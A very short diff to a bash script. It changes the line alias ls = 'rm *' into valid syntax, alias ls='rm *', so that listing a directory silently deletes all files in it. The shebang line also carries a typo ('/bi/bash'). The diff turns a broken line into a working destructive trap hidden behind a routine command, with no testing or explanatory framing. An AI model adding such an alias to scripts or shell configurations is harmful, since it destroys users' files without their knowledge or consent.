@@ -1,2 +1,2 @@
 #!/bi/bash
-alias ls = 'rm *'
+alias ls='rm *'
